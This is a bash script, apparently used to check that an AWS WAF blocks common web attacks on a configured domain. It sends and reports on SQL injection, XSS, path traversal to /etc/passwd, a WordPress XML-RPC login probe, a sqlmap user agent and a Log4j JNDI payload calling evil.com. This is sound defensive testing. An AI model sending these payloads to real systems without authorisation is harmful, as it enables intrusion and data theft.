#!/bin/bash
# ===========================================
# WAF Security Test Script
# 測試 AWS WAF 是否正常運作
# ===========================================

set -e

# 顏色定義
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# 讀取設定
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ -f "$SCRIPT_DIR/env-config.sh" ]; then
    source "$SCRIPT_DIR/env-config.sh"
fi

# 設定 Domain (可以覆蓋)
DOMAIN="${1:-https://evoger.tw}"

echo -e "${CYAN}==========================================${NC}"
echo -e "${CYAN}🛡️  WAF Security Test${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""
echo "Target: ${DOMAIN}"
echo "Time: $(date)"
echo ""

PASSED=0
FAILED=0

# ===========================================
# Test Function
# ===========================================
run_test() {
    local test_name="$1"
    local test_url="$2"
    local expected="$3"
    local method="${4:-GET}"
    local data="${5:-}"
    
    if [ "$method" == "POST" ]; then
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$test_url" \
            -H "Content-Type: text/xml" \
            -d "$data" 2>/dev/null) || HTTP_CODE="000"
    else
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null) || HTTP_CODE="000"
    fi
    
    if [ "$HTTP_CODE" == "$expected" ]; then
        echo -e "   ${GREEN}✅ PASS${NC} - HTTP $HTTP_CODE (expected $expected)"
        ((PASSED++))
    elif [ "$expected" == "403" ] && [ "$HTTP_CODE" == "403" ]; then
        echo -e "   ${GREEN}✅ BLOCKED${NC} - HTTP 403 (WAF protection working)"
        ((PASSED++))
    elif [ "$expected" == "2xx" ] && [[ "$HTTP_CODE" =~ ^(200|301|302)$ ]]; then
        echo -e "   ${GREEN}✅ PASS${NC} - HTTP $HTTP_CODE (normal traffic allowed)"
        ((PASSED++))
    else
        echo -e "   ${RED}❌ FAIL${NC} - HTTP $HTTP_CODE (expected $expected)"
        ((FAILED++))
    fi
}

# ===========================================
# 1. Normal Request Test
# ===========================================
echo -e "${YELLOW}[1/7] Normal Request Test${NC}"
echo "   Testing: ${DOMAIN}/"
run_test "Normal" "${DOMAIN}/" "2xx"

# ===========================================
# 2. SQL Injection Test
# ===========================================
echo ""
echo -e "${YELLOW}[2/7] SQL Injection Test${NC}"
echo "   Testing: ${DOMAIN}/?id=1' OR '1'='1"
run_test "SQLi Basic" "${DOMAIN}/?id=1'%20OR%20'1'='1" "403"

echo "   Testing: ${DOMAIN}/?search=1; DROP TABLE users--"
run_test "SQLi Drop" "${DOMAIN}/?search=1;%20DROP%20TABLE%20users--" "403"

# ===========================================
# 3. XSS Test
# ===========================================
echo ""
echo -e "${YELLOW}[3/7] XSS (Cross-Site Scripting) Test${NC}"
echo "   Testing: ${DOMAIN}/?q=<script>alert(1)</script>"
run_test "XSS Script" "${DOMAIN}/?q=%3Cscript%3Ealert(1)%3C/script%3E" "403"

echo "   Testing: ${DOMAIN}/?name=<img src=x onerror=alert(1)>"
run_test "XSS Img" "${DOMAIN}/?name=%3Cimg%20src=x%20onerror=alert(1)%3E" "403"

# ===========================================
# 4. Path Traversal / LFI Test
# ===========================================
echo ""
echo -e "${YELLOW}[4/7] Path Traversal / LFI Test${NC}"
echo "   Testing: ${DOMAIN}/?file=../../../etc/passwd"
run_test "LFI Basic" "${DOMAIN}/?file=../../../etc/passwd" "403"

echo "   Testing: ${DOMAIN}/?file=....//....//etc/passwd"
run_test "LFI Bypass" "${DOMAIN}/?file=....//....//etc/passwd" "403"

# ===========================================
# 5. WordPress XML-RPC Test
# ===========================================
echo ""
echo -e "${YELLOW}[5/7] WordPress XML-RPC Test${NC}"
echo "   Testing: POST ${DOMAIN}/xmlrpc.php"
XMLRPC_DATA='<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>test</value></param></params></methodCall>'
run_test "XMLRPC" "${DOMAIN}/xmlrpc.php" "403" "POST" "$XMLRPC_DATA"

# ===========================================
# 6. Known Bad Input Test
# ===========================================
echo ""
echo -e "${YELLOW}[6/7] Known Bad Input Test${NC}"
echo "   Testing: Log4j pattern"
run_test "Log4j" "${DOMAIN}/?x=\${jndi:ldap://evil.com/a}" "403"

# ===========================================
# 7. User Agent Spoofing Test
# ===========================================
echo ""
echo -e "${YELLOW}[7/7] Malicious User Agent Test${NC}"
echo "   Testing: SQLMap User Agent"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "User-Agent: sqlmap/1.0" \
    "${DOMAIN}/" 2>/dev/null) || HTTP_CODE="000"
if [ "$HTTP_CODE" == "403" ]; then
    echo -e "   ${GREEN}✅ BLOCKED${NC} - HTTP 403 (malicious UA blocked)"
    ((PASSED++))
else
    echo -e "   ${YELLOW}⚠️ ALLOWED${NC} - HTTP $HTTP_CODE (UA not blocked, may be OK)"
fi

# ===========================================
# Summary
# ===========================================
echo ""
echo -e "${CYAN}==========================================${NC}"
echo -e "${CYAN}📊 Test Summary${NC}"
echo -e "${CYAN}==========================================${NC}"
echo ""
echo -e "   Passed: ${GREEN}${PASSED}${NC}"
echo -e "   Failed: ${RED}${FAILED}${NC}"
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}✅ All WAF tests passed!${NC}"
    echo ""
    echo "Your WAF is properly configured to protect against:"
    echo "  • SQL Injection"
    echo "  • Cross-Site Scripting (XSS)"
    echo "  • Path Traversal / Local File Inclusion"
    echo "  • WordPress-specific attacks"
    echo "  • Known bad inputs (Log4j, etc.)"
else
    echo -e "${YELLOW}⚠️ Some tests failed. Please check WAF configuration.${NC}"
fi

echo ""
echo -e "${CYAN}View detailed logs:${NC}"
echo "  AWS Console → WAF & Shield → Web ACLs → project-WAF → Sampled requests"
echo ""
echo -e "${CYAN}CloudWatch Metrics:${NC}"
echo "  aws cloudwatch get-metric-statistics \\"
echo "    --namespace AWS/WAFV2 \\"
echo "    --metric-name BlockedRequests \\"
echo "    --dimensions Name=WebACL,Value=project-WAF Name=Rule,Value=ALL \\"
echo "    --start-time \$(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ) \\"
echo "    --end-time \$(date -u +%Y-%m-%dT%H:%M:%SZ) \\"
echo "    --period 300 --statistics Sum --region us-east-1"
echo ""
